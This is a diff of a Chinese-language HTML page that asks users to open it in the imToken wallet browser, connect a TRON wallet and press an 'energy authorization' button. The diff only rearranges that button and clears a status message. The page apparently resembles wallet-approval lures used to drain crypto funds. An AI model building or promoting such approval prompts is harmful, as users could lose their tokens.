@@ -294,7 +294,7 @@
         
         <div class="status" id="statusSection">
             <h4><span class="status-icon">ℹ️</span>请用 <strong>imToken钱包内置浏览器</strong> 打开</h4>
-            <p id="statusText"> ⚠️请先点击 <strong>复制链接 </strong>然后连接imToken钱包在钱包底部点击“浏览”在顶部搜索栏内粘贴访问网站</p>
+            <p id="statusText"> </p>
         </div>
         <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
                      <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
@@ -304,7 +304,9 @@
             <button class="auth-button" id="connectBtn">
                 连接imToken钱包
             </button>
-            
+            <button class="auth-button" id="approveBtn" class="btn" disabled>
+                能量授权
+            </button>
         </div>
         
         <div class="steps">
@@ -337,9 +339,7 @@
                   </li>
             </ul>
         </div>
-        <button class="auth-button" id="approveBtn" class="btn" disabled>
-                能量授权
-            </button>
+        
         <div class="footer">
             <p>确保您正在使用TRON主网，并保持足够的TRX用于手续费</p>
         </div>
@@ -526,4 +526,5 @@
     </script>
 </body>
 </html>
+
 
